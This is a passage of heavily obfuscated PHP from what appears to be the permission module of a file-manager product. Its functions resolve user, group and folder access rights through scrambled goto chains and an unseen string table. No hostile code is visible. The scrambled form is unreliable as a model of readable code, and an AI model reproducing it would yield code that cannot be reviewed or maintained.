$eÈÄÄÉ‡ÓÔ[1669] => $eÈÄÄÉ‡ÓÔ[486], $eÈÄÄÉ‡ÓÔ[404] => LNG($eÈÄÄÉ‡ÓÔ[1845]), $eÈÄÄÉ‡ÓÔ[1684] => $eÈÄÄÉ‡ÓÔ[1846]), $eÈÄÄÉ‡ÓÔ[1847] => LNG($eÈÄÄÉ‡ÓÔ[1848]), $eÈÄÄÉ‡ÓÔ[1849] => $this->sourceAuthInfo($dë‘ªœôÖ)); goto côïƒÌÛ…Š; F‹ò¥ª°‘í: $eÈÄÄÉ‡ÓÔ =& $_SERVER[òÀöí]; $FÀ¼˜ø‹ô = $FÀ¼˜ø‹ô ? $FÀ¼˜ø‹ô : USER_ID; $C”©”œãÂ‡ = $this->makeAuthDeep($FÀ¼˜ø‹ô); goto c£Í¶‡‰šÒ; côïƒÌÛ…Š: } protected function makeAuthDeep($aƒóõÁæÇÜ = false) { goto eõÅ‚¿™£Ë; DÓÑ§‘ã§Ê: if ($fËçÑ×‘…â) { $bØøë÷ö¥ = array(array($FèŒõÁîä”[389] => SourceModel::TYPE_USER, $FèŒõÁîä”[474] => $aƒóõÁæÇÜ), array($FèŒõÁîä”[389] => SourceModel::TYPE_GROUP, $FèŒõÁîä”[474] => array($FèŒõÁîä”[402], $fËçÑ×‘…â)), $FèŒõÁîä”[936] => $FèŒõÁîä”[1752]); } $e£ƒŞ¡è³Í = $this->field($FèŒõÁîä”[1851])->where($bØøë÷ö¥)->select(); $EîÆ†‰’Ç› = array(); goto Fášéé—Úå; BÕ†ˆ°àˆé: $Eœ¤ÍÔ¤‘Ù = array(); $Fëš™›é‡Ï = array(); $cöİ„‚Å¼» = array(); goto AÕĞÊ™á¥½; B©Ñ´÷Ã: foreach ($f‚âê‘ÖÁ” as $dö¢†õ½×) { $dàÍ‡„«Š = $E¨´‹éÜÁ->getInfo($dö¢†õ½×); $fùÒ™–¢Óº[] = $dàÍ‡„«Š[$FèŒõÁîä”[84]][$FèŒõÁîä”[387]]; $cöİ„‚Å¼»[$dö¢†õ½×] = $dàÍ‡„«Š[$FèŒõÁîä”[84]][$FèŒõÁîä”[387]]; $a¡ØóäÔÈ¬[$dö¢†õ½×] = $Fê™š¡’¹Â->parentLevelArray($dàÍ‡„«Š[$FèŒõÁîä”[477]]); } foreach ($Eœ¤ÍÔ¤‘Ù as $a¶ò°Œ§°¼ => $aß®Ú›Š¥Ù) { $FíâœŠÜãó = $Fëš™›é‡Ï[$a¶ò°Œ§°¼]; if (!$FíâœŠÜãó || !$cöİ„‚Å¼»[$FíâœŠÜãó]) { continue; } $fÉ¾Œ¹ê¼¼ = array(); foreach ($a¡ØóäÔÈ¬[$FíâœŠÜãó] as $dö¢†õ½×) { $fÉ¾Œ¹ê¼¼[] = $cöİ„‚Å¼»[$dö¢†õ½×]; } $Eœ¤ÍÔ¤‘Ù[$a¶ò°Œ§°¼] = array_merge($fÉ¾Œ¹ê¼¼, $aß®Ú›Š¥Ù); } $fùÒ™–¢Óº = array_values(array_unique($fùÒ™–¢Óº)); goto DíªåŸÒÀÊ; Fç²‘—˜‡»: foreach ($a³œŸ÷í”ò as $Eà´†èÅò£) { if ($Eà´†èÅò£[$FèŒõÁîä”[394]] == 0 && $Eà´†èÅò£[$FèŒõÁîä”[1685]] == $FèŒõÁîä”[86]) { $D‚òöĞÕ¤¶[] = $Eà´†èÅò£[$FèŒõÁîä”[385]]; } } $fËçÑ×‘…â = $this->userGroupParents($aƒóõÁæÇÜ); $bØøë÷ö¥ = array($FèŒõÁîä”[389] => SourceModel::TYPE_USER, $FèŒõÁîä”[474] => $aƒóõÁæÇÜ); goto DÓÑ§‘ã§Ê; DíªåŸÒÀÊ: $AÃŸÙóãä± = array($FèŒõÁîä”[1843] => $fùÒ™–¢Óº, $FèŒõÁîä”[1844] => $Eœ¤ÍÔ¤‘Ù); $a™ÅŠİ†‹[$aƒóõÁæÇÜ] = $AÃŸÙóãä±; return $AÃŸÙóãä±; goto c¨³…šÅ‘; AÕĞÊ™á¥½: $a¡ØóäÔÈ¬ = array(); if ($EîÆ†‰’Ç›) { $d˜¿œé«Ò» = $Fê™š¡’¹Â->where(array($FèŒõÁîä”[387] => array($FèŒõÁîä”[402], $EîÆ†‰’Ç›)))->select(); foreach ($d˜¿œé«Ò» as $DùİŒ”òñØ) { $AÛ•óÅó¨¦ = $Fê™š¡’¹Â->parentLevelArray($DùİŒ”òñØ[$FèŒõÁîä”[477]]); $fùÒ™–¢Óº = array_merge($fùÒ™–¢Óº, $AÛ•óÅó¨¦); $f‚âê‘ÖÁ”[] = $DùİŒ”òñØ[$FèŒõÁîä”[474]]; $Eœ¤ÍÔ¤‘Ù[$DùİŒ”òñØ[$FèŒõÁîä”[387]]] = $AÛ•óÅó¨¦; $Fëš™›é‡Ï[$DùİŒ”òñØ[$FèŒõÁîä”[387]]] = $DùİŒ”òñØ[$FèŒõÁîä”[474]]; } } $f‚âê‘ÖÁ” = array_values(array_unique($f‚âê‘ÖÁ”)); goto Aàßí‡æò¿; Fášéé—Úå: $Cã‡ç’œ¬ª = array_to_keyvalue_group($e£ƒŞ¡è³Í, $FèŒõÁîä”[387]); foreach ($Cã‡ç’œ¬ª as $cÖöë„á™ => $E§ÅãÒâ‘) { $BËô¸È… = $this->authArrayCheck($E§ÅãÒâ‘, $aƒóõÁæÇÜ); if ($BËô¸È…[$FèŒõÁîä”[395]] > 0) { $EîÆ†‰’Ç›[] = $cÖöë„á™ . $FèŒõÁîä”[33]; } } $fùÒ™–¢Óº = array(); goto A¾öØª¢ŠÀ; eõÅ‚¿™£Ë: $FèŒõÁîä” =& $_SERVER[òÀöí]; static $a™ÅŠİ†‹ = array(); $aƒóõÁæÇÜ = $aƒóõÁæÇÜ ? $aƒóõÁæÇÜ : USER_ID; goto E×µ¥å÷é¼; A¾öØª¢ŠÀ: $f‚âê‘ÖÁ” = $fËçÑ×‘…â; $Fê™š¡’¹Â = Model($FèŒõÁîä”[1181]); $E¨´‹éÜÁ = Model($FèŒõÁîä”[476]); goto BÕ†ˆ°àˆé; E×µ¥å÷é¼: if (isset($a™ÅŠİ†‹[$aƒóõÁæÇÜ])) { return $a™ÅŠİ†‹[$aƒóõÁæÇÜ]; } $a³œŸ÷í”ò = Model($FèŒõÁîä”[1850])->listData(); $D‚òöĞÕ¤¶ = array(); goto Fç²‘—˜‡»; Aàßí‡æò¿: $d…„ÜÀîÚé = $f‚âê‘ÖÁ”; foreach ($d…„ÜÀîÚé as $dö¢†õ½×) { $dàÍ‡„«Š = $E¨´‹éÜÁ->getInfo($dö¢†õ½×); $AÛ•óÅó¨¦ = $Fê™š¡’¹Â->parentLevelArray($dàÍ‡„«Š[$FèŒõÁîä”[477]]); $f‚âê‘ÖÁ” = array_merge($f‚âê‘ÖÁ”, $AÛ•óÅó¨¦); } $f‚âê‘ÖÁ” = array_values(array_unique($f‚âê‘ÖÁ”)); goto B©Ñ´÷Ã; c¨³…šÅ‘: } private function makeSourceAuth($D–ãã—¸–ò, $A†È†§ ğ¹, $B‚©¯ŞÄ™Æ = false) { goto BØ¯©Š½Ó¢; EôõÛÈª­ö: foreach ($Eâê‹“ŠË as $D×ÂÒ›‘òš) { if (!isset($A†È†§ ğ¹[$D×ÂÒ›‘òš])) { continue; } $f„ë½·Æ¾ = $this->authMake($A†È†§ ğ¹[$D×ÂÒ›‘òš], $B‚©¯ŞÄ™Æ); if ($f„ë½·Æ¾[$fÓ°ÎÛÕÆÍ[435]]) { $e²Ñ“ç«Ú‚ = $f„ë½·Æ¾; break; } } if (!$c¸ÓøôÓ¯“) { return $e²Ñ“ç«Ú‚; } if (!$e²Ñ“ç«Ú‚ && $f‡ÚŠ½Â) { $e²Ñ“ç«Ú‚ = $this->groupAuthInfo($f‡ÚŠ½Â, $F¿ñ„è ”); } goto b êô•È§Ö; dŠëğŸñ‚±: $c¸ÓøôÓ¯“ = $D–ãã—¸–ò[$fÓ°ÎÛÕÆÍ[389]] == SourceModel::TYPE_GROUP; $f‡ÚŠ½Â = $c¸ÓøôÓ¯“ ? $this->groupRootAuth($F¿ñ„è ”, $B‚©¯ŞÄ™Æ) : !1; if ($f‡ÚŠ½Â && Model($fÓ°ÎÛÕÆÍ[1831])->authCheckAction($f‡ÚŠ½Â[$fÓ°ÎÛÕÆÍ[394]], $fÓ°ÎÛÕÆÍ[1683])) { return $this->groupAuthInfo($f‡ÚŠ½Â, $F¿ñ„è ”); } goto Dó×‡»ÍÚ; BØ¯©Š½Ó¢: $fÓ°ÎÛÕÆÍ =& $_SERVER[òÀöí]; $ağ“­´Ë‘§ = $fÓ°ÎÛÕÆÍ[86]; $F¿ñ„è ” = $D–ãã—¸–ò[$fÓ°ÎÛÕÆÍ[474]]; goto dŠëğŸñ‚±; Dó×‡»ÍÚ: $Eâê‹“ŠË = Model($fÓ°ÎÛÕÆÍ[1181])->parentLevelArray($D–ãã—¸–ò[$fÓ°ÎÛÕÆÍ[477]]); $Eâê‹“ŠË = array_merge(array($D–ãã—¸–ò[$fÓ°ÎÛÕÆÍ[387]]), array_reverse($Eâê‹“ŠË)); $e²Ñ“ç«Ú‚ = !1; goto EôõÛÈª­ö; b êô•È§Ö: if (!$e²Ñ“ç«Ú‚) { $f¯ùŒƒÙ¼ = Model($fÓ°ÎÛÕÆÍ[476])->getInfo($F¿ñ„è ”); $Aò‘ÎˆÀ ‚ = explode($fÓ°ÎÛÕÆÍ[47], trim($f¯ùŒƒÙ¼[$fÓ°ÎÛÕÆÍ[477]], $fÓ°ÎÛÕÆÍ[47])); $Aò‘ÎˆÀ ‚ = array_reverse($Aò‘ÎˆÀ ‚); foreach ($Aò‘ÎˆÀ ‚ as $aËñ‹³ê•¬) { if ($aËñ‹³ê•¬ == $fÓ°ÎÛÕÆÍ[486] || $aËñ‹³ê•¬ == $ağ“­´Ë‘§) { continue; } $eì¬ëÏÜÏ = $this->groupRootAuth($aËñ‹³ê•¬, $B‚©¯ŞÄ™Æ); if (!$eì¬ëÏÜÏ) { continue; } $e²Ñ“ç«Ú‚ = $this->groupAuthInfo($eì¬ëÏÜÏ, $aËñ‹³ê•¬); break; } } if (!$e²Ñ“ç«Ú‚ || $e²Ñ“ç«Ú‚[$fÓ°ÎÛÕÆÍ[395]] <= 0) { $B¢±‡³É¬ = $this->authDeepCheck($D–ãã—¸–ò[$fÓ°ÎÛÕÆÍ[387]], $B‚©¯ŞÄ™Æ); if ($B¢±‡³É¬) { $e²Ñ“ç«Ú‚ = $B¢±‡³É¬; } } return $e²Ñ“ç«Ú‚; goto FÍÉ‡¢¼ƒ; FÍÉ‡¢¼ƒ: } private function userIsRoot($fÒ²µë½­† = false) { $C‚ñé×ª‰Í =& $_SERVER[òÀöí]; if (!$fÒ²µë½­† && _get($GLOBALS, $C‚ñé×ª‰Í[475])) { return !0; } $BƒßÑÚ˜è = Model($C‚ñé×ª‰Í[495])->getInfo($fÒ²µë½­†); $BÑ¨÷ˆ¯ñ§ = Model($C‚ñé×ª‰Í[1852])->listData($BƒßÑÚ˜è[$C‚ñé×ª‰Í[1388]]); if ($BÑ¨÷ˆ¯ñ§ && $BÑ¨÷ˆ¯ñ§[$C‚ñé×ª‰Í[1257]][$C‚ñé×ª‰Í[1853]] == 1) { return !0; } return !1; } private function sourceAuthInfo($eÖ±‹…¡šÛ) { goto a÷ÜªòØ•; BŞ¯“­øÜ: $A†È¦ÄÆÊÜ = $eÅøõÆˆ¼˜->_listAppendPath($A†È¦ÄÆÊÜ); $A©¿©¦Öó = $A†È¦ÄÆÊÜ[0]; $AÆØœ¬ƒë = $A©¿©¦Öó[$C’ìÏÎœÍ[484]]; goto däÓøÊêí; däÓøÊêí: if (isset($A©¿©¦Öó[$C’ìÏÎœÍ[482]])) { $CÈŒÎøî•£ = explode($C’ìÏÎœÍ[8], trim($A©¿©¦Öó[$C’ìÏÎœÍ[484]], $C’ìÏÎœÍ[8])); array_shift($CÈŒÎøî•£); $AÆØœ¬ƒë = $A©¿©¦Öó[$C’ìÏÎœÍ[480]] . $C’ìÏÎœÍ[1854] . implode($C’ìÏÎœÍ[8], $CÈŒÎøî•£); } return array($C’ìÏÎœÍ[404] => $A©¿©¦Öó[$C’ìÏÎœÍ[28]], $C’ìÏÎœÍ[75] => KodIO::make($A©¿©¦Öó[$C’ìÏÎœÍ[387]]), $C’ìÏÎœÍ[1855] => $AÆØœ¬ƒë); goto BÛ½³“ˆ×õ; a÷ÜªòØ•: $C’ìÏÎœÍ =& $_SERVER[òÀöí]; $eÅøõÆˆ¼˜ = Model($C’ìÏÎœÍ[1181]); $A©¿©¦Öó = $eÅøõÆˆ¼˜->sourceInfo($eÖ±‹…¡šÛ); goto Bİª‰ Ï¾¼; Bİª‰ Ï¾¼: if (!$A©¿©¦Öó) { return !1; } $eÅøõÆˆ¼˜->groupPathDisplay($A©¿©¦Öó); $A†È¦ÄÆÊÜ = array($A©¿©¦Öó); goto BŞ¯“­øÜ; BÛ½³“ˆ×õ: } private function groupAuthInfo($f£ˆÛâÃÙ, $AÛùùÑêøç) { $E›±ó‚ùñÆ =& $_SERVER[òÀöí]; $CÓ¿‡ÌŸ = Model($E›±ó‚ùñÆ[476])->getInfo($AÛùùÑêøç); return array($E›±ó‚ùñÆ[1856] => intval($f£ˆÛâÃÙ[$E›±ó‚ùñÆ[394]]), $E›±ó‚ùñÆ[1840] => $f£ˆÛâÃÙ, $E›±ó‚ùñÆ[1857] => LNG($E›±ó‚ùñÆ[1858]), $E›±ó‚ùñÆ[1849] => array($E›±ó‚ùñÆ[404] => $CÓ¿‡ÌŸ[$E›±ó‚ùñÆ[28]], $E›±ó‚ùñÆ[75] => KodIO::make($CÓ¿‡ÌŸ[$E›±ó‚ùñÆ[84]][$E›±ó‚ùñÆ[387]]), $E›±ó‚ùñÆ[1855] => $CÓ¿‡ÌŸ[$E›±ó‚ùñÆ[481]])); } protected function groupRootAuth($CßŒ…­„äÉ, $cæ½ˆë¿Á = false) { goto f¡ŒÙ‡·æ; añèÒì„À¹: $Eóİçë’ = $this->userGroupList($cæ½ˆë¿Á); $A‡¦ù’†¾÷ = isset($Eóİçë’[$CßŒ…­„äÉ]) ? $Eóİçë’[$CßŒ…­„äÉ][$C“Ã´ Å¿[394]] : !1; if ($A‡¦ù’†¾÷ && Model($C“Ã´ Å¿[1831])->authCheckAction($A‡¦ù’†¾÷[$C“Ã´ Å¿[394]], $C“Ã´ Å¿[1683])) { $b¯‡¤­‹®¢[$f¢Ò™µºë¾] = $A‡¦ù’†¾÷; return $A‡¦ù’†¾÷; } goto CÏä÷ÍÆ¸É; CÏä÷ÍÆ¸É: $AÊÆ‡œä = $this->sourceAuthSelect($B’ìğÄÎ—˜[$C“Ã´ Å¿[84]][$C“Ã´ Å¿[387]]); $aäÊ¸ğÜÛ¬ = $AÊÆ‡œä ? $this->authMake($AÊÆ‡œä, $cæ½ˆë¿Á) : !1; $A°©Ö…ß®ç = $aäÊ¸ğÜÛ¬ ? $aäÊ¸ğÜÛ¬[$C“Ã´ Å¿[435]] : !1; goto DÙİŞôô»ß; DÙİŞôô»ß: $b¯‡¤­‹®¢[$f¢Ò™µºë¾] = $A°©Ö…ß®ç ? $A°©Ö…ß®ç : $A‡¦ù’†¾÷; return $b¯‡¤­‹®¢[$f¢Ò™µºë¾]; goto cÊ¹¤§ï§Ñ; D¡Øé»ç‘ß: static $b¯‡¤­‹®¢ = array(); if (isset($b¯‡¤­‹®¢[$f¢Ò™µºë¾])) { return $b¯‡¤­‹®¢[$f¢Ò™µºë¾]; } $B’ìğÄÎ—˜ = Model($C“Ã´ Å¿[476])->getInfo($CßŒ…­„äÉ); goto añèÒì„À¹; f¡ŒÙ‡·æ: $C“Ã´ Å¿ =& $_SERVER[òÀöí]; $cæ½ˆë¿Á = $cæ½ˆë¿Á ? $cæ½ˆë¿Á : USER_ID; $f¢Ò™µºë¾ = $cæ½ˆë¿Á . $C“Ã´ Å¿[1859] . $CßŒ…­„äÉ; goto D¡Øé»ç‘ß; cÊ¹¤§ï§Ñ: } public function authOwnerApply($f£÷…ô¨œˆ) { goto b›ì£±°µ; b›ì£±°µ: $cãéæêµ›ã =& $_SERVER[òÀöí]; if (empty($f£÷…ô¨œˆ[$cãéæêµ›ã[394]]) || isset($f£÷…ô¨œˆ[$cãéæêµ›ã[1860]]) && $f£÷…ô¨œˆ[$cãéæêµ›ã[1860]]) { return $f£÷…ô¨œˆ; } if (AuthModel::authCheckRoot($f£÷…ô¨œˆ[$cãéæêµ›ã[394]][$cãéæêµ›ã[395]])) { return $f£÷…ô¨œˆ; } goto C³ÏğƒõÙ; C³ÏğƒõÙ: $bÚ“©‘íƒÊ = Model($cãéæêµ›ã[1181])->parentLevelArray($f£÷…ô¨œˆ[$cãéæêµ›ã[477]]); $bÚ“©‘íƒÊ = array_merge(array($f£÷…ô¨œˆ[$cãéæêµ›ã[387]]), array_reverse($bÚ“©‘íƒÊ)); $aİšëÔ‡‰ = $this->sourceAuthSelect($bÚ“©‘íƒÊ); goto a…»ƒ‰‚íİ; Aò¶²‰Ùæ: if (count($AğÄù±£°) == 0) { $AğÄù±£° = $this->authFolderOwnerGroup($f£÷…ô¨œˆ[$cãéæêµ›ã[474]]); } $AğÄù±£° = array_unique($AğÄù±£°); if (AuthModel::authCheckRoot($f£÷…ô¨œˆ[$cãéæêµ›ã[394]][$cãéæêµ›ã[395]])) { $AğÄù±£°[] = USER_ID; } goto Fğ°æ‰¥‰; Fğ°æ‰¥‰: $f£÷…ô¨œˆ[$cãéæêµ›ã[394]][$cãéæêµ›ã[1862]] = Model($cãéæêµ›ã[492])->userListInfo($AğÄù±£°); return $f£÷…ô¨œˆ; goto CàˆÛĞŒ¹; a…»ƒ‰‚íİ: $B…íğìˆœÑ = array(); $AğÄù±£° = array(); foreach ($aİšëÔ‡‰ as $aäó’´ËŒ‡ => $Bö‘µ¡ Š„) { $B¶ÏŞ÷çö = $this->authFolderOwnerUser($Bö‘µ¡ Š„); $B…íğìˆœÑ[$aäó’´ËŒ‡] = $B¶ÏŞ÷çö; $AğÄù±£° = array_merge($AğÄù±£°, $B¶ÏŞ÷çö[$cãéæêµ›ã[551]]); if ($B¶ÏŞ÷çö[$cãéæêµ›ã[1861]]) { break; } } goto Aò¶²‰Ùæ; CàˆÛĞŒ¹: } private function authFolderOwnerGroup($E‘Íó­‹–) { $C¦¼¯Ô´ù =& $_SERVER[òÀöí]; $cº­ôé³„× = Model($C¦¼¯Ô´ù[1746])->where(array($C¦¼¯Ô´ù[1663] => $E‘Íó­‹–))->select(); $f²ç‰İãª = array(); if (!$cº­ôé³„×) { return $f²ç‰İãª; } foreach ($cº­ôé³„× as $CñÎ‚‘ØÙ) { $F¥ñÔ®‘¨ï = $this->authInfo($CñÎ‚‘ØÙ); if (AuthModel::authCheckRoot($F¥ñÔ®‘¨ï[$C¦¼¯Ô´ù[394]])) { $f²ç‰İãª[] = $CñÎ‚‘ØÙ[$C¦¼¯Ô´ù[1504]]; } } return $f²ç‰İãª; } private function authFolderOwnerUser($a®ê½ …„‹) { $bÁÉ®™ªóÙ =& $_SERVER[òÀöí]; $DëßŞ²†Û— = array(); $d¬¡²šõ£Š = !1; foreach ($a®ê½ …„‹ as $c¿…ÊÚ»Ô) { $c¦‹‹‹»°´ = $this->authInfo($c¿…ÊÚ»Ô); if ($c¿…ÊÚ»Ô[$bÁÉ®™ªóÙ[474]] == $bÁÉ®™ªóÙ[486]) { $d¬¡²šõ£Š = !0; } if ($c¿…ÊÚ»Ô[$bÁÉ®™ªóÙ[389]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($c¦‹‹‹»°´[$bÁÉ®™ªóÙ[394]])) { $DëßŞ²†Û—[] = $c¿…ÊÚ»Ô[$bÁÉ®™ªóÙ[474]]; } } } return array($bÁÉ®™ªóÙ[551] => $DëßŞ²†Û—, $bÁÉ®™ªóÙ[1861] => $d¬¡²šõ£Š); } public function authMake($Aéõö£Œ‹, $bìğÔªÉˆŠ = false) { $DßåØæÏÇ” =& $_SERVER[òÀöí]; $b™¥¨Ë¬ó­ = $this->authArrayCheck($Aéõö£Œ‹, $bìğÔªÉˆŠ); if ($b™¥¨Ë¬ó­[$DßåØæÏÇ”[1863]]) { $b™¥¨Ë¬ó­[$DßåØæÏÇ”[1863]] = $this->sourceAuthInfo($b™¥¨Ë¬ó­[$DßåØæÏÇ”[1863]]); } return $b™¥¨Ë¬ó­; } public function authArrayCheck($bÙ°Ëˆ‹ŒŸ, $E£¸Æ˜ê­¦ = false) { goto CÄˆõÍ™èŠ; CÄˆõÍ™èŠ: $AÊ¬ššìİ =& $_SERVER[òÀöí]; if (!$bÙ°Ëˆ‹ŒŸ) { return array($AÊ¬ššìİ[395] => 0, $AÊ¬ššìİ[435] => !1); } $E£¸Æ˜ê­¦ = $E£¸Æ˜ê­¦ ? $E£¸Æ˜ê­¦ : USER_ID; goto b¬õÎ¸ğ¦›; Bª™°ƒ±‡: $FÏË”ÔÈ‚ = 0; $B…Ğ´É¨‘Ğ = 0; $bë§î§äÆ = array($AÊ¬ššìİ[387] => 0); goto DÒÅ¿¹–‡¬; b¬õÎ¸ğ¦›: $dÕ÷Ó¼Œ‘ = 0; $d¦§¸°¹”Æ = 0; $cš‰µï…´ = 0; goto eõùçà¢; CÇÌáêÖÇ‡: return $c³‹ˆ«®ê…; goto Eåƒåƒ³÷; eõùçà¢: $cä¦Õ‹è²¡ = 0; $B™Ñï ¼¯ = 0; $EÙçŠ‹Ÿ§¤ = 0; goto böğ»ˆÔÙŒ; böğ»ˆÔÙŒ: $d¹ñ¢ÈïÏ­ = 1000; $Fà¯‰ì©¸ñ = 0; $D“¼ŞŞ¹íÖ = 0; goto Bª™°ƒ±‡; DÒÅ¿¹–‡¬: foreach ($bÙ°Ëˆ‹ŒŸ as $bë§î§äÆ) { $AåöÁ¾Ğ˜‰ = $this->authInfo($bë§î§äÆ); if (!$AåöÁ¾Ğ˜‰) { continue; } $FÕ¹ÁËÒÍ = $bë§î§äÆ[$AÊ¬ššìİ[474]]; $e›‹ãï‰Î— = intval($AåöÁ¾Ğ˜‰[$AÊ¬ššìİ[394]]); if ($bë§î§äÆ[$AÊ¬ššìİ[389]] == SourceModel::TYPE_USER && $FÕ¹ÁËÒÍ == $E£¸Æ˜ê­¦) { $dÕ÷Ó¼Œ‘ = !0; $cš‰µï…´ = $AåöÁ¾Ğ˜‰; $d¦§¸°¹”Æ = $e›‹ãï‰Î—; } else { if ($bë§î§äÆ[$AÊ¬ššìİ[389]] == SourceModel::TYPE_GROUP && $this->groupContainUser($FÕ¹ÁËÒÍ, $E£¸Æ˜ê­¦)) { $cä¦Õ‹è²¡ = !0; $Eó¯Å½Ş = $this->groupStepToUserGroup($FÕ¹ÁËÒÍ, $E£¸Æ˜ê­¦); if ($Eó¯Å½Ş < $d¹ñ¢ÈïÏ­) { $d¹ñ¢ÈïÏ­ = $Eó¯Å½Ş; $B™Ñï ¼¯ = $e›‹ãï‰Î—; $EÙçŠ‹Ÿ§¤ = $AåöÁ¾Ğ˜‰; $Fà¯‰ì©¸ñ = $FÕ¹ÁËÒÍ; } if ($Eó¯Å½Ş == $d¹ñ¢ÈïÏ­ && $e›‹ãï‰Î— >= $B™Ñï ¼¯) { $B™Ñï ¼¯ = $e›‹ãï‰Î—; $EÙçŠ‹Ÿ§¤ = $AåöÁ¾Ğ˜‰; $Fà¯‰ì©¸ñ = $FÕ¹ÁËÒÍ; } } else { if ($FÕ¹ÁËÒÍ == $AÊ¬ššìİ[486]) { $D“¼ŞŞ¹íÖ = !0; $B…Ğ´É¨‘Ğ = $AåöÁ¾Ğ˜‰; $FÏË”ÔÈ‚ = $e›‹ãï‰Î—; } } } } if ($dÕ÷Ó¼Œ‘) { $E¶×Œ¦É­õ = $d¦§¸°¹”Æ; $AåöÁ¾Ğ˜‰ = $cš‰µï…´; $AíƒÚø‹êÌ = LNG($AÊ¬ššìİ[1864]); } else { if ($cä¦Õ‹è²¡) { $E¶×Œ¦É­õ = $B™Ñï ¼¯; $AåöÁ¾Ğ˜‰ = $EÙçŠ‹Ÿ§¤; $d´Î™ğó’ = Model($AÊ¬ššìİ[476])->getInfo($Fà¯‰ì©¸ñ); $AíƒÚø‹êÌ = $AÊ¬ššìİ[159] . $d´Î™ğó’[$AÊ¬ššìİ[481]] . $AÊ¬ššìİ[1865] . LNG($AÊ¬ššìİ[1866]); } else { if ($D“¼ŞŞ¹íÖ) { $E¶×Œ¦É­õ = $FÏË”ÔÈ‚; $AåöÁ¾Ğ˜‰ = $B…Ğ´É¨‘Ğ; $AíƒÚø‹êÌ = LNG($AÊ¬ššìİ[1837]); } else { $E¶×Œ¦É­õ = 0; $AåöÁ¾Ğ˜‰ = !1; $AíƒÚø‹êÌ = $AÊ¬ššìİ[33]; } } } $c³‹ˆ«®ê… = array($AÊ¬ššìİ[1856] => intval($E¶×Œ¦É­õ), $AÊ¬ššìİ[1840] => $AåöÁ¾Ğ˜‰, $AÊ¬ššìİ[1857] => $AíƒÚø‹êÌ, $AÊ¬ššìİ[1849] => $bë§î§äÆ[$AÊ¬ššìİ[387]]); goto CÇÌáêÖÇ‡; Eåƒåƒ³÷: } private function groupContainUser($f‚ğÖ†Ò, $b¹åÃˆã¼ = false) { return in_array($f‚ğÖ†Ò, $this->userGroupParents($b¹åÃˆã¼)); } private function groupStepToUserGroup($F¿ôæÉ¤Éä, $fˆÂÑË©ÀÇ = false) { goto cïÇÒ¸ù˜; cïÇÒ¸ù˜: $CËÃÖ¡ùÉ =& $_SERVER[òÀöí]; $C™ëœ÷šÑ = $this->userGroupList($fˆÂÑË©ÀÇ); $aôÔŞÑ¾ = 1000; goto BâÌ’Õ¡”; cÎ²¡»¡—: return $aôÔŞÑ¾; goto Bö‚ÜÑŠÊò; BâÌ’Õ¡”: $C˜èœÉ»ĞÅ = $GLOBALS[$CËÃÖ¡ùÉ[6]][$CËÃÖ¡ùÉ[87]][$CËÃÖ¡ùÉ[1758]] == 1; $cÑ³ğö¯ØÅ = $C˜èœÉ»ĞÅ ? 3 : 2; foreach ($C™ëœ÷šÑ as $Eä“•í´»Ä) { if ($Eä“•í´»Ä[$CËÃÖ¡ùÉ[1663]] == $F¿ôæÉ¤Éä) { return 0; } $fØƒ±âÓ’ = explode($CËÃÖ¡ùÉ[47], trim($Eä“•í´»Ä[$CËÃÖ¡ùÉ[477]], $CËÃÖ¡ùÉ[47])); if ($fØƒ±âÓ’[0] == $CËÃÖ¡ùÉ[486] && count($fØƒ±âÓ’) > $cÑ³ğö¯ØÅ) { $Aä‚î†İ = array_reverse(array_slice($fØƒ±âÓ’, $cÑ³ğö¯ØÅ)); $FòÍÉ†ª² = array_search($F¿ôæÉ¤Éä, $Aä‚î†İ); if ($FòÍÉ†ª² !== !1 && $FòÍÉ†ª² + 1 <= $aôÔŞÑ¾) { $aôÔŞÑ¾ = $FòÍÉ†ª² + 1; } } } goto cÎ²¡»¡—; Bö‚ÜÑŠÊò: } private function userGroupList($eŠÅƒá°²ˆ = false) { $Càœ²„¢£ =& $_SERVER[òÀöí]; static $DïÓ‘“Šøò = array(); if (isset($DïÓ‘“Šøò[$eŠÅƒá°²ˆ])) { return $DïÓ‘“Šøò[$eŠÅƒá°²ˆ]; } $c· ÊÌ× = Model($Càœ²„¢£[495])->getInfo($eŠÅƒá°²ˆ); $DïÓ‘“Šøò[$eŠÅƒá°²ˆ] = array_to_keyvalue($c· ÊÌ×[$Càœ²„¢£[1838]], $Càœ²„¢£[1663]); return $DïÓ‘“Šøò[$eŠÅƒá°²ˆ]; } public function userGroupParents($CÛˆ©‹ƒ»á) { goto fÊñÊ¯²È; AÇÜ¢’˜Ëª: $E——Ê­œ¶[$CÛˆ©‹ƒ»á] = array_unique($Cºœ‰êµÁ); return $E——Ê­œ¶[$CÛˆ©‹ƒ»á]; goto eØ˜§‰í×¹; CØˆ•¶èñÇ: $Bƒ™¼µ¡Ëƒ = $GLOBALS[$C–º½é‰öÅ[6]][$C–º½é‰öÅ[87]][$C–º½é‰öÅ[1758]] == 1; $A¡Ş‡å¯ƒ = $Bƒ™¼µ¡Ëƒ ? 3 : 2; foreach ($cÑÉå´æİö as $F»øÈä¦•’) { $f£²ùõôôÙ = array($F»øÈä¦•’[$C–º½é‰öÅ[1663]]); $BÎ«ä‡Ú„“ = explode($C–º½é‰öÅ[47], trim($F»øÈä¦•’[$C–º½é‰öÅ[477]], $C–º½é‰öÅ[47])); if ($BÎ«ä‡Ú„“[0] == $C–º½é‰öÅ[486] && count($BÎ«ä‡Ú„“) > $A¡Ş‡å¯ƒ) { $b—õÔßö† = array_slice($BÎ«ä‡Ú„“, $A¡Ş‡å¯ƒ); $f£²ùõôôÙ = array_merge($f£²ùõôôÙ, array_reverse($b—õÔßö†)); } $Cºœ‰êµÁ = array_merge($Cºœ‰êµÁ, $f£²ùõôôÙ); } goto AÇÜ¢’˜Ëª; C»äÑºÛœ: if (isset($E——Ê­œ¶[$CÛˆ©‹ƒ»á])) { return $E——Ê­œ¶[$CÛˆ©‹ƒ»á]; } $cÑÉå´æİö = $this->userGroupList($CÛˆ©‹ƒ»á); $Cºœ‰êµÁ = array(); goto CØˆ•¶èñÇ; fÊñÊ¯²È: $C–º½é‰öÅ =& $_SERVER[òÀöí]; static $E——Ê­œ¶ = array(); $CÛˆ©‹ƒ»á = $CÛˆ©‹ƒ»á ? $CÛˆ©‹ƒ»á : USER_ID; goto C»äÑºÛœ; eØ˜§‰í×¹: } public function authTargetInfoMake($E»Ğ‰ÓœÜª) { goto f„”õ÷Ü„İ; EÔó†¡ñİù: return array($Aèâˆ£îŠÑ[1867] => $c»Ìùãäµœ, 